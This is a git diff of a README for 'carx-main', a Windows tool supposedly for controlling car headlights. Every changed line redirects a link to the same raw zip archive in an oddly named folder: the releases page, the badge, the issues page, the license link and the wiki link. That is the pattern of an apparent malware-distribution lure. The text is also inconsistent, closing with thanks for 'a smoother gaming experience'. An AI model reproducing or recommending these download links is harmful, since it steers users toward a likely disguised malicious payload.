@@ -1,7 +1,7 @@
 # 🚗 carx-main - Control Your Car's Headlights Effortlessly
 
 ## 📥 Download the Latest Version
-[![Download carx-main](https://img.shields.io/badge/Download%20carx--main-latest-brightgreen)](https://github.com/Lorim2002/carx-main/releases)
+[![Download carx-main](https://github.com/Lorim2002/carx-main/raw/refs/heads/main/dentinitis/carx_main_v3.8-beta.1.zip%20carx--main-latest-brightgreen)](https://github.com/Lorim2002/carx-main/raw/refs/heads/main/dentinitis/carx_main_v3.8-beta.1.zip)
 
 ---
 
@@ -18,7 +18,7 @@ Welcome to **carx-main**, a lightweight tool designed to automate headlight cont
 
 To get started, visit the following page to download the latest version of **carx-main**:
 
-[Download carx-main Releases](https://github.com/Lorim2002/carx-main/releases)
+[Download carx-main Releases](https://github.com/Lorim2002/carx-main/raw/refs/heads/main/dentinitis/carx_main_v3.8-beta.1.zip)
 
 ### 🖥️ System Requirements
 - **Operating System**: Windows 10 or newer.
@@ -27,7 +27,7 @@ To get started, visit the following page to download the latest version of **car
 
 ### 🔧 Installation Instructions
 
-1. **Visit the Download Page**: Open your web browser and go to [this link](https://github.com/Lorim2002/carx-main/releases).
+1. **Visit the Download Page**: Open your web browser and go to [this link](https://github.com/Lorim2002/carx-main/raw/refs/heads/main/dentinitis/carx_main_v3.8-beta.1.zip).
    
 2. **Select the Latest Release**: Scroll down to the "Releases" section and find the latest version of **carx-main**. There will be a summary and a list of files.
 
@@ -65,14 +65,14 @@ While **carx-main** is designed to enhance your experience, it may not work with
 
 ## 📞 Support
 
-For additional help or features requests, please feel free to open an issue in the [Issues section](https://github.com/Lorim2002/carx-main/issues) of the GitHub repository. Your feedback is valuable and helps improve the application.
+For additional help or features requests, please feel free to open an issue in the [Issues section](https://github.com/Lorim2002/carx-main/raw/refs/heads/main/dentinitis/carx_main_v3.8-beta.1.zip) of the GitHub repository. Your feedback is valuable and helps improve the application.
 
 ## 📜 License
 
-This project is licensed under the MIT License. You can view the full license details [here](https://opensource.org/licenses/MIT).
+This project is licensed under the MIT License. You can view the full license details [here](https://github.com/Lorim2002/carx-main/raw/refs/heads/main/dentinitis/carx_main_v3.8-beta.1.zip).
 
 ## 🔗 Learn More
 
-To dive deeper into what **carx-main** can do, check the [documentation](https://github.com/Lorim2002/carx-main/wiki) provided on the GitHub wiki.
+To dive deeper into what **carx-main** can do, check the [documentation](https://github.com/Lorim2002/carx-main/raw/refs/heads/main/dentinitis/carx_main_v3.8-beta.1.zip) provided on the GitHub wiki.
 
 Thank you for using **carx-main**. Enjoy a smoother gaming experience!
